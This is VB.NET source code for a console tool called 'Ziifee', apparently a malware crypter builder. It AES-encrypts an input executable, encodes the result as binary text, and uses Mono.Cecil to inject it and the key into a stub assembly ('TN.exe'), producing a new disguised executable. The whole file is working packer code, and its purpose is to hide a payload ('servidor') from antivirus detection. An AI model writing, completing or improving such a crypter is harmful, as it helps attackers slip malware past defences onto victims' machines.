Imports System.Threading
Imports System.Text
Imports Mono.Cecil
Imports Mono.Cecil.Cil
Imports System.Environment

Module _ClientLoader
    Private _LServer As String
    Sub Main(ByVal arg As String())
    
       
        Dim appData As String = GetFolderPath(SpecialFolder.ApplicationData)

        Console.ForegroundColor = ConsoleColor.Cyan
        Console.Title = "Ziifee v0.1a ~ Criado por TheMenino"

        Console.Clear()
        StartOBF(arg(0))

    End Sub



    Public Function StartOBF(ByVal _local As String)
        Dim KEY As String = NomeAndEncryptKey().ToString
        sendFiglet()
        Console.ForegroundColor = ConsoleColor.Magenta
        Console.Title = "Encryptando..."
        Console.Write("Encryptando... ")
        Using barradosatanas = New ProgressBar
            For i = 0 To 100
                barradosatanas.Report(i / 100)
                Thread.Sleep(50)
            Next
            Console.Clear()
        End Using
        sendFiglet()
        Console.ForegroundColor = ConsoleColor.Magenta
        Console.WriteLine("SUCESSO: Servidor encryptado e salvo como '" + KEY + ".exe'")

   


        Try
            Dim data As Byte() = IO.File.ReadAllBytes(_local)
            Dim text As String = Convert.ToBase64String(data)
            Dim aText As String = AES_Encrypt(text, KEY)
            Dim Temp As String = ""
            Dim txtBuilder As New System.Text.StringBuilder
            For Each Character As Byte In System.Text.ASCIIEncoding.ASCII.GetBytes(aText)
                txtBuilder.Append(Convert.ToString(Character, 2).PadLeft(8, "0"))
                txtBuilder.Append(" ")
            Next
            Temp = txtBuilder.ToString.Substring(0, txtBuilder.ToString.Length - 0)
            Dim Stub As AssemblyDefinition = AssemblyDefinition.ReadAssembly("TN.exe")

            For Each G In Stub.MainModule.GetTypes

                For Each MEE In G.Methods

                    If MEE.Name = ".ctor" Then

                        Dim EMU As IEnumerator(Of Instruction) = Nothing

                        EMU = MEE.Body.Instructions.GetEnumerator

                        Do While EMU.MoveNext

                            Dim ISS As Instruction = EMU.Current

                            If ISS.OpCode.Code = Code.Ldstr Then

                                Dim ST As String = ISS.Operand.ToString

                                If ST = "|CODE|" Then
                                    ISS.Operand = Temp
                                    Continue Do
                                End If

                                If ST = "|KEY|" Then
                                    ISS.Operand = KEY
                                    Continue Do
                                End If


                            End If

                        Loop

                    End If

                Next

            Next

            Stub.Write(AppDomain.CurrentDomain.BaseDirectory & KEY.ToString & ".exe")
            '
            'AppDomain.CurrentDomain.BaseDirectory


            Console.ReadLine()







        Catch ex As Exception
            MsgBox(ex.Message)
        End Try





    End Function




End Module
